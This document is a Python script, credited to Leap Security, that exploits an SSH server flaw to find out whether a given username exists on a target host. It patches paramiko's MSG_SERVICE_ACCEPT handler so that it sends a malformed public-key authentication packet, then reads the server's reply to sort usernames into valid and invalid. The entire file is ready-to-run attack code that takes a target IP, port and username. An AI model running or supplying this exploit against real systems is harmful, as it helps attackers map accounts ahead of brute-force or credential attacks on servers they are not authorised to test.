import argparse
import logging
import paramiko
import socket
import sys

class InvalidUsername(Exception):
    pass

# Malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# Malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# Call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# Assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# Perform authentication with malicious packet and username
def check_user(username, target_ip, port):
    try:
        sock = socket.socket()
        sock.connect((target_ip, port))
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        print("[+] {} is a valid username".format(username))
    except paramiko.ssh_exception.SSHException:
        logging.error('Failed to negotiate SSH transport')
        sys.exit(2)
    except InvalidUsername:
        print("[-] {} is an invalid username".format(username))
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))

# Configure logging
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, type=int, help="Set port of SSH service")
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username, args.target, args.port)
